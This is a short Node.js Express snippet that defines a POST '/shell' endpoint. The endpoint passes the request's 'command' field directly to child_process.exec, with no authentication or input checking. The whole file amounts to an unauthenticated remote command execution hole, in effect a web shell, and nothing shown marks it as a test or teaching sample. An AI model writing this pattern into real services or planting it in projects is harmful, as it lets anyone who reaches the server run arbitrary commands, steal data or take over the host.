import express from "express";
import { exec } from "child_process";

const app = express();
app.post("/shell", (req, res) => {
  exec(req.body.command);
  res.sendStatus(202);
});
